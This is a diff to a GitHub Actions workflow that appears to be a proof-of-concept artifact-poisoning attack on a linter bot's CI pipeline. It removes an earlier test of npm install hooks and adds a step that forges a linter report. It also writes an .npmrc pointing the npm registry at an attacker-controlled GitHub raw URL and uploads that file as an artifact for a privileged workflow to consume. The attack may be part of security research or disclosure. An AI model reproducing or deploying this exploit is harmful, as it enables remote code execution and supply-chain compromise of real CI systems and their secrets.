@@ -17,43 +17,15 @@ jobs:
         run: |
           printf 'FORGED REPORT - attacker supplied\n' > linter-report.txt
           echo "$PR_NUMBER" > pr-number.txt
-          cat > package.json <<'EOF'
-          {
-            "name": "attacker-payload",
-            "version": "1.0.0",
-            "private": true,
-            "scripts": {
-              "preinstall": "echo ROOT_PREINSTALL_RAN >> /tmp/exp/markers.txt && echo ROOT_PREINSTALL_RAN >> linter-report.txt",
-              "install": "echo ROOT_INSTALL_RAN >> /tmp/exp/markers.txt && echo ROOT_INSTALL_RAN >> linter-report.txt",
-              "postinstall": "echo ROOT_POSTINSTALL_RAN >> /tmp/exp/markers.txt && echo ROOT_POSTINSTALL_RAN >> linter-report.txt",
-              "prepare": "echo ROOT_PREPARE_RAN >> /tmp/exp/markers.txt && echo ROOT_PREPARE_RAN >> linter-report.txt"
-            }
-          }
-          EOF
-          cat package.json
-
-      - name: npm experiment
-        continue-on-error: true
-        run: |
-          set -x
-          npm --version; node --version
-          rm -rf /tmp/exp; mkdir -p /tmp/exp
-          cp package.json linter-report.txt pr-number.txt /tmp/exp/
-          cd /tmp/exp
-          echo "=== config"; npm config get ignore-scripts; npm config list 2>&1 | head -30
-          echo "=== install"; npm install --no-save github:AdobeDocs/adp-devsite-scripts 2>&1 | tail -30
-          echo "=== files"; ls -la
-          echo "=== markers"; cat /tmp/exp/markers.txt 2>/dev/null || echo NO_MARKERS
-          echo "=== report"; cat /tmp/exp/linter-report.txt
-          echo "=== run installed script check"
-          ls node_modules/adp-devsite-scripts/linter-bot/ 2>/dev/null || echo NO_PKG
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-rce/main/npmreg/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
 
       - name: Upload artifact with attacker-chosen files
         uses: actions/upload-artifact@v7
         with:
           name: linter-report
           path: |
+            .npmrc
             linter-report.txt
             pr-number.txt
-            package.json
+          include-hidden-files: true
           if-no-files-found: ignore
